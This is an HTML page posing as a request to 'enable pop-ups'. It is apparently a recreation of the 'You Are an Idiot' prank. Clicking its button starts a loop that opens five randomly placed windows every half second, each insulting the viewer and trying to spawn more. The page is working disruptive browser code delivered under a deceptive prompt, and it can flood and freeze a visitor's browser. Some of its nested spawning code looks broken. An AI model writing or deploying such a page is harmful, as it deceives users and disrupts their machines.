<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enable Pop-ups</title>
</head>
<body>
    <script>
        function requestPopups() {
            // Open a single 'about:blank' window
            var initialWin = window.open("about:blank", "_blank", "width=400,height=200");

            if (initialWin) {
                initialWin.document.write(`
                    <html>
                    <head>
                        <title>Allow Pop-ups & Redirects</title>
                        <style>
                            body { text-align: center; font-size: 20px; padding-top: 50px; }
                            button { font-size: 18px; padding: 10px 20px; cursor: pointer; }
                        </style>
                    </head>
                    <body>
                        <p>Click the button below to enable pop-ups.</p>
                        <button onclick="startMadness()">Enable</button>

                        <script>
                            function startMadness() {
                                window.opener.startChaos();
                            }
                        <\\/script>
                    </body>
                    </html>
                `);
                initialWin.document.close();
            }
        }

        function openChaosWindow() {
            var newWin = window.open("about:blank", "_blank", "width=357,height=330");

            if (newWin) {
                var screenWidth = screen.width - 357;
                var screenHeight = screen.height - 330;
                var randomX = Math.floor(Math.random() * screenWidth);
                var randomY = Math.floor(Math.random() * screenHeight);

                newWin.moveTo(randomX, randomY);

                newWin.document.write(`
                    <html>
                    <head>
                        <title>You Are an Idiot!</title>
                        <style>
                            body { background: yellow; color: black; text-align: center; font-size: 20px; margin-top: 100px; }
                        </style>
                    </head>
                    <body>
                        <h1>You are an IDIOT! ðŸ¤¡</h1>
                        <script>
                            function spawnMore() {
                                for (var i = 0; i < 3; i++) {
                                    var childWin = window.open("about:blank", "_blank", "width=357,height=330");
                                    if (childWin) {
                                        childWin.document.write('<script>setTimeout(spawnMore, 1000);<\\/script>');
                                        childWin.document.close();
                                    }
                                }
                            }
                            setTimeout(spawnMore, 1000);
                        </script>
                    </body>
                    </html>
                `);

                newWin.document.close();
            }
        }

        function startChaos() {
            setInterval(() => {
                for (var i = 0; i < 5; i++) {
                    openChaosWindow();
                }
            }, 500); // Adjust for faster or slower chaos
        }

        // Automatically open the permission request on load
        requestPopups();
    </script>
</body>
</html>
